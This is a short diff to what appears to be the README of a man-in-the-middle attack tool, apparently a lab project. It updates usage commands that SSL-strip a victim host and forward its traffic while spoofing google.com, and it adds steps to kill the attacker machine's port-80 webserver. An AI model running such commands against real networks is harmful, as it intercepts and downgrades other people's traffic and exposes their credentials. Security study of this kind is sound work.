@@ -27,5 +27,7 @@ Clear ARP table: `sudo ip -s -s neigh flush all`
 
 4. SSL Strip the victim: `sudo python3 main.py --interface "enp0s10" sslStrip --ipVictim "10.0.123.5" --siteToSpoof "google.com"` 
 
-STILL BROKEN:
-5. Forward `sudo python3 main.py --interface "enp0s10" forward --ipVictim "10.0.123.5" --ipToSpoof "142.250.179.174"` _google.com_
+### For the forwarder to work we must first terminate the webserver that is running by default on the attacker machine.
+### 1. Determine the PID of the process: sudo lsof -i :80
+### 2. Kill the process: sudo kill -9 <PID>
+5. Forward `sudo python3 main.py --interface "enp0s10" forward --ipVictim "10.0.123.5" --siteToSpoof "google.com"`
